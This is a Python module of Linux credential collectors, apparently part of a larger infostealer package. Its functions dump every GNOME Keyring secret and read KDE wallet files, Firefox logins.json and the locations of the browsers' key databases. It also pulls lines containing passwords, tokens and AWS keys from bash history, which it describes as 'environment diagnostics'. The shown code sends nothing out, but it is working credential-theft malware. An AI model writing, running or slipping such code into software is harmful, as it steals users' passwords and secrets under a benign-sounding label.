"""
Linux-specific credential collectors.
"""
import subprocess
import os
from pathlib import Path
from typing import Dict, List, Any
from ..utils import get_home_dir, safe_read_file


def collect_gnome_keyring() -> List[Dict[str, Any]]:
    """
    Collect GNOME Keyring data using secret-tool.
    
    Returns:
        List of keyring data
    """
    keyring_data = []
    
    try:
        # List all secrets
        result = subprocess.run(
            ['secret-tool', 'search', '--all', ''],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode == 0:
            keyring_data.append({
                'type': 'gnome_keyring',
                'content': result.stdout
            })
    except Exception:
        pass
    
    return keyring_data


def collect_kde_wallet() -> List[Dict[str, Any]]:
    """
    Collect KDE Wallet information.
    
    Returns:
        List of KDE wallet data
    """
    wallet_data = []
    
    wallet_dir = get_home_dir() / '.local' / 'share' / 'kwalletd'
    if wallet_dir.exists():
        try:
            for wallet_file in wallet_dir.iterdir():
                if wallet_file.suffix == '.kwl':
                    content = safe_read_file(str(wallet_file))
                    if content:
                        wallet_data.append({
                            'type': 'kde_wallet',
                            'path': str(wallet_file),
                            'content': content[:5000]
                        })
        except Exception:
            pass
    
    return wallet_data


def collect_browser_data() -> List[Dict[str, Any]]:
    """
    Collect Linux browser credential data.
    
    Returns:
        List of browser data
    """
    browser_data = []
    
    # Chrome/Chromium
    chrome_dirs = [
        get_home_dir() / '.config' / 'google-chrome' / 'Default',
        get_home_dir() / '.config' / 'chromium' / 'Default'
    ]
    
    for chrome_dir in chrome_dirs:
        if chrome_dir.exists():
            # Login Data (SQLite database with credentials)
            login_data = chrome_dir / 'Login Data'
            if login_data.exists():
                browser_data.append({
                    'type': 'chrome_login_data',
                    'path': str(login_data),
                    'note': 'SQLite database with encrypted credentials'
                })
    
    # Firefox
    firefox_dir = get_home_dir() / '.mozilla' / 'firefox'
    if firefox_dir.exists():
        try:
            for profile in firefox_dir.iterdir():
                if profile.is_dir() and 'default' in profile.name.lower():
                    # logins.json
                    logins = profile / 'logins.json'
                    if logins.exists():
                        content = safe_read_file(str(logins))
                        if content:
                            browser_data.append({
                                'type': 'firefox_logins',
                                'path': str(logins),
                                'content': content
                            })
                    
                    # key4.db (master password)
                    key_db = profile / 'key4.db'
                    if key_db.exists():
                        browser_data.append({
                            'type': 'firefox_key_db',
                            'path': str(key_db),
                            'note': 'SQLite database with master key'
                        })
        except Exception:
            pass
    
    return browser_data


def collect_bash_history() -> List[Dict[str, Any]]:
    """
    Collect bash history for environment diagnostics.
    
    Returns:
        List containing bash history
    """
    history_data = []
    
    bash_history = get_home_dir() / '.bash_history'
    if bash_history.exists():
        content = safe_read_file(str(bash_history))
        if content:
            # Look for sensitive commands
            lines = content.split('\n')
            sensitive_lines = [
                line for line in lines
                if any(keyword in line.lower() for keyword in 
                       ['password', 'token', 'api_key', 'secret', 'aws', 'export'])
            ]
            
            if sensitive_lines:
                history_data.append({
                    'type': 'bash_history',
                    'content': '\n'.join(sensitive_lines[-100:])  # Last 100 sensitive commands
                })
    
    return history_data


def collect_linux_data() -> Dict[str, Any]:
    """
    Collect all Linux-specific environment data.
    
    Returns:
        Dictionary containing all collected Linux data
    """
    data = {
        'gnome_keyring': collect_gnome_keyring(),
        'kde_wallet': collect_kde_wallet(),
        'browsers': collect_browser_data(),
        'bash_history': collect_bash_history()
    }
    
    return data
